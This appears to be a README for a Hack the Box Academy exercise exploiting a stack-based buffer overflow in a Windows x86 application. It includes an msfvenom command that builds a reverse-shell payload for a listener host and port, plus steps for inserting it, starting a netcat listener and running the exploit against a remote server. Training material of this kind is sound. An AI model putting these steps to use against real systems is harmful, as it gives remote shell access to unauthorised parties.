#General Information
This exploit was written for the skills assessment portion of Hack the Box
Academy's Stack-based Buffer Overflows for Windows x86 module. The goal of 
the module was to make the reader proficient at exploiting stack-based 
buffer overflow vulnerabilities in x86 Windows applications.The skills 
assessment required you to download a program file, develop an exploit for
the application, and exploit an image of that application running on a 
remote server. Keeping that premise in mind, this exploit meets those goals
by building a reverse shell payload tailored for the application, and 
delivering that payload via a TCP connection established by a socket. 
I will not disclose the specific methodologies used to develop this 
exploit as I believe it would rob the reader of the learning opportunity 
provided by the module.

#Usage Instructions
**IMPORTANT:** The payload used inside this exploit, being a reverse shell,
requires a listening host, and a listening port. That being said, you will
**NOT** be able to utilize this exploit, as it is, to get a reverse shell 
on your own system. A user will have to replace the "buf" variable with 
a payload generated specifying their ip address (i.e. as it appears after 
running `ifconfig {interface}`), and an associated port number. The payload
in this exploit was generated using a command similar to this:
`msfvenom -p 'windows/shell_reverse_tcp' LHOST='{listening-ipaddr}' LPORT='{listening-port}' -f python -b '\x00\x0A\x0D'`

To utilize the exploit:
- Clone the repository locally
- Navigate inside the project folder
- Generate your custom payload using msfvenom or other similar tools 
- Replace the "buf" variable with your own payload
- Save the file
- Give the exploit.py file executable permissions
- Setup a Netcat Listener
- Execute the following shell command `./exploit.py '{ipaddr-of-remote-server}'`
